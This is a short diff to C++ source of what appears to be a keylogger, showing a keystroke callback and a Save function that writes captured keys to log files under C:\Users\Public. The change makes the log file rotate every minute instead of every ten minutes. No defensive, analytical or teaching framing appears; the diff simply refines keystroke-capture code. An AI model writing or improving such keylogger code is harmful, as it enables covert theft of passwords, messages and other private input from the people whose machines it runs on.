@@ -67,7 +67,7 @@ int Save(int key_stroke);
 std::ofstream output_file;
 
 char output_filename[32];
-int cur_10min_interval = -1;
+int cur_1min_interval = -1;
 
 // This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
@@ -183,10 +183,10 @@ int Save(int key_stroke)
 		output << char(key);
 	}
 #endif
-	// Determine current 10-minute interval and base log file on that
-	int current_10min = (tm_info.tm_hour * 60 + tm_info.tm_min) / 10;
-	if (cur_10min_interval != current_10min) {
-		cur_10min_interval = current_10min;
+	// Determine current 1-minute interval and base log file on that
+	int current_1min = (tm_info.tm_hour * 60 + tm_info.tm_min);
+	if (cur_1min_interval != current_1min) {
+		cur_1min_interval = current_1min;
 		output_file.close();
 		// Create logs folder if it doesn't exist
 		const char* logs_dir = "C:\\Users\\Public";
